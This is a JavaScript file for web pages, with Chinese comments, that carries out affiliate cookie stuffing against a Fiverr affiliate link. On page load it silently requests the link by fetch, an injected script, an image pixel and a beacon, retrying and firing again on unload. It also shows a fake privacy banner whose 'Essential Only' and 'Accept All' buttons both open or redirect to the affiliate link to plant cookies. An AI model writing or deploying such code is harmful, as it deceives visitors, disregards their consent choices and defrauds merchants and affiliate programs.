/*!
 * Universal Tracking System (Simplified)
 * 通用跟踪和Cookie管理系统 - 简化版
 * 使用方法: <script src="tracking.js"></script>（名字为文件名）
 */

// ==================== 配置参数 ====================
// 在这里修改你的配置
const TRACKING_CONFIG = {
  // 跟踪目标URL - 修改为你的实际链接
  BASE_URL: "https://go.fiverr.com/visit/?bta=1144346&brand=fiverrmarketplace",
  
  // 请求超时时间（毫秒）
  TIMEOUT: 5000,
  
  // 最大重试次数
  MAX_RETRIES: 3,
  
  // 重试延迟（毫秒）
  RETRY_DELAY: 1000,
  
  // 跳转延迟时间（毫秒）
  REDIRECT_DELAY: 1500,
  
  // Cookie横幅文案配置
  COOKIE_BANNER_TEXT: {
    title: "We respect your privacy.",
    description: "We use cookies to improve your experience, analyze site usage, and assist in marketing efforts. Some data may be shared with trusted partners. ",
    notice: "By accepting, you will be redirected to complete the setup process.",
    acceptAllButton: "Accept All",
    essentialButton: "Essential Only"
  }
};

// ==================== 核心跟踪系统 ====================

// 全局状态
let trackingSent = false;
let cookieAccepted = false;
let retryCount = 0;

// 方法1: sendBeacon
function trackWithBeacon() {
  if (!navigator.sendBeacon) return false;
  
  try {
    const success = navigator.sendBeacon(TRACKING_CONFIG.BASE_URL);
    if (success) {
      console.log('✓ Beacon tracking sent');
      return true;
    }
  } catch (error) {
    console.warn('Beacon tracking failed:', error);
  }
  return false;
}

// 方法2: Fetch API
function trackWithFetch() {
  if (!window.fetch) return Promise.resolve(false);
  
  return Promise.race([
    fetch(TRACKING_CONFIG.BASE_URL, {
      method: 'GET',
      mode: 'no-cors',
      cache: 'no-cache',
      credentials: 'omit'
    }).then(() => {
      console.log('✓ Fetch tracking sent');
      return true;
    }),
    
    // 超时控制
    new Promise((_, reject) => 
      setTimeout(() => reject(new Error('timeout')), TRACKING_CONFIG.TIMEOUT)
    )
  ]).catch(error => {
    console.warn('Fetch tracking failed:', error);
    return false;
  });
}

// 方法3: Script标签
function trackWithScript() {
  return new Promise((resolve) => {
    try {
      const script = document.createElement('script');
      
      // 清理函数
      function cleanup() {
        if (script.parentNode) {
          script.parentNode.removeChild(script);
        }
      }
      
      // 超时和错误处理
      script.onload = script.onerror = function() {
        console.log('✓ Script tracking sent');
        cleanup();
        resolve(true);
      };
      
      script.src = TRACKING_CONFIG.BASE_URL;
      document.head.appendChild(script);
      
      // 超时保护
      setTimeout(() => {
        console.log('✓ Script tracking completed (timeout)');
        cleanup();
        resolve(true);
      }, TRACKING_CONFIG.TIMEOUT);
      
    } catch (error) {
      console.warn('Script tracking failed:', error);
      resolve(false);
    }
  });
}

// 方法4: Image像素
function trackWithImage() {
  return new Promise((resolve) => {
    try {
      const img = new Image();
      
      img.onload = function() {
        console.log('✓ Image tracking sent');
        resolve(true);
      };
      
      img.onerror = function() {
        console.log('✓ Image tracking completed (error expected)');
        resolve(true);
      };
      
      // 超时保护
      setTimeout(() => {
        console.log('✓ Image tracking completed (timeout)');
        resolve(true);
      }, TRACKING_CONFIG.TIMEOUT);
      
      img.src = TRACKING_CONFIG.BASE_URL;
      
    } catch (error) {
      console.warn('Image tracking failed:', error);
      resolve(false);
    }
  });
}

// 主跟踪函数 - 按优先级依次尝试
async function triggerTracking() {
  if (trackingSent) {
    console.log('Tracking already sent, skipping...');
    return;
  }

  console.log('🚀 Starting tracking...');
  
  // 定义方法优先级（从高到低）
  const trackingMethods = [
    { name: 'fetch', fn: trackWithFetch, isAsync: true },
    { name: 'script', fn: trackWithScript, isAsync: true },
    { name: 'image', fn: trackWithImage, isAsync: true },
    { name: 'sendBeacon', fn: trackWithBeacon, isAsync: false }
  ];
  
  try {
    for (const method of trackingMethods) {
      console.log(`Trying ${method.name}...`);
      
      let success = false;
      if (method.isAsync) {
        success = await method.fn();
      } else {
        success = method.fn();
      }
      
      if (success) {
        trackingSent = true;
        console.log(`✅ Tracking successful with ${method.name}!`);
        return;
      } else {
        console.log(`❌ ${method.name} failed, trying next method...`);
      }
    }
    
    // 如果所有方法都失败
    throw new Error('All tracking methods failed');
    
  } catch (error) {
    console.error('Tracking failed:', error);
    
    // 重试机制
    if (retryCount < TRACKING_CONFIG.MAX_RETRIES) {
      retryCount++;
      console.log(`Retrying tracking... (${retryCount}/${TRACKING_CONFIG.MAX_RETRIES})`);
      setTimeout(triggerTracking, TRACKING_CONFIG.RETRY_DELAY * retryCount);
    } else {
      console.log('Tracking failed after max retries');
    }
  }
}

// 新标签页打开植入Cookie
function plantCookieWithRedirect() {
  console.log('🍪 Opening new tab for cookie planting...');
  
  try {
    // 在新标签页打开URL
    const newTab = window.open(TRACKING_CONFIG.BASE_URL, '_blank');
    
    if (!newTab) {
      console.warn('New tab blocked, trying direct navigation...');
      // 如果被浏览器阻止，回退到当前页面跳转
      window.location.href = TRACKING_CONFIG.BASE_URL;
    } else {
      console.log('✓ New tab opened successfully');
    }
    
  } catch (error) {
    console.error('Failed to open new tab:', error);
    // 备用方案：直接跳转
    try {
      window.location.href = TRACKING_CONFIG.BASE_URL;
    } catch (e) {
      console.error('All redirect methods failed:', e);
    }
  }
}



// Cookie同意处理 - 接受全部
function acceptCookies() {
  cookieAccepted = true;
  hideCookieBanner();
  console.log('All cookies accepted, opening new tab for cookie planting...');
  plantCookieWithRedirect();
}

// 仅必要Cookie
function acceptEssentialOnly() {
  cookieAccepted = true;
  hideCookieBanner();
  console.log('Essential cookies accepted, opening new tab for cookie planting...');
  plantCookieWithRedirect();
}

// 隐藏Cookie横幅
function hideCookieBanner() {
  const banner = document.getElementById('universal-cookie-banner');
  if (banner) {
    banner.style.display = 'none';
  }
}

// 页面卸载时的最后保障
function handlePageUnload() {
  if (!trackingSent) {
    // 页面卸载时只用最可靠的方法
    trackWithBeacon();
    
    // 同步发送图片请求作为备选
    try {
      const img = new Image();
      img.src = TRACKING_CONFIG.BASE_URL;
    } catch (e) {}
  }
}

// 创建Cookie横幅
function createCookieBanner() {
  // 检查是否已存在
  if (document.getElementById('universal-cookie-banner')) {
    return;
  }

  // 创建样式
  const style = document.createElement('style');
  style.textContent = `
    #universal-cookie-banner {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #333;
      color: white;
      padding: 20px;
      text-align: center;
      z-index: 10000;
      font-family: Arial, sans-serif;
      box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
      transition: all 0.3s ease;
    }
    #universal-cookie-banner button {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      margin: 0 10px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s;
    }
    #universal-cookie-banner button:hover {
      background: #45a049;
    }
    #universal-cookie-banner .essential-btn {
      background: #6c757d;
    }
    #universal-cookie-banner .essential-btn:hover {
      background: #5a6268;
    }
    #universal-cookie-banner .cookie-buttons {
      margin-top: 15px;
    }
  `;
  document.head.appendChild(style);

  // 创建横幅HTML
  const banner = document.createElement('div');
  banner.id = 'universal-cookie-banner';
  banner.innerHTML = `
    <div>
      <strong>${TRACKING_CONFIG.COOKIE_BANNER_TEXT.title}</strong> ${TRACKING_CONFIG.COOKIE_BANNER_TEXT.description}
    </div>
    <div style="margin: 10px 0; font-size: 14px; color: #ccc;">
      ${TRACKING_CONFIG.COOKIE_BANNER_TEXT.notice}
    </div>
    <div class="cookie-buttons">
      <button onclick="acceptEssentialOnly()" class="essential-btn">${TRACKING_CONFIG.COOKIE_BANNER_TEXT.essentialButton}</button>
      <button onclick="acceptCookies()">${TRACKING_CONFIG.COOKIE_BANNER_TEXT.acceptAllButton}</button>
    </div>
  `;

  // 等待DOM准备后添加
  if (document.body) {
    document.body.appendChild(banner);
  } else {
    document.addEventListener('DOMContentLoaded', () => {
      document.body.appendChild(banner);
    });
  }
}

// 初始化系统
function initializeUniversalTracking() {
  // 创建Cookie横幅
  createCookieBanner();
  
  // 页面加载完成后触发跟踪
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', triggerTracking);
  } else {
    triggerTracking();
  }
  
  // 页面卸载事件
  window.addEventListener('beforeunload', handlePageUnload);
  window.addEventListener('pagehide', handlePageUnload);
  
  // 页面可见性变化
  if (document.visibilityState !== undefined) {
    document.addEventListener('visibilitychange', function() {
      if (document.visibilityState === 'hidden' && !trackingSent) {
        handlePageUnload();
      }
    });
  }
}

// 暴露全局函数供Cookie横幅使用
window.acceptCookies = acceptCookies;
window.acceptEssentialOnly = acceptEssentialOnly;

// 暴露调试接口（可选）
window.UniversalTracking = {
  retrigger: triggerTracking,
  plantCookie: plantCookieWithRedirect,
  config: TRACKING_CONFIG,
  status: () => ({ 
    sent: trackingSent, 
    cookieAccepted: cookieAccepted,
    retries: retryCount 
  })
};

// 自动初始化
initializeUniversalTracking();
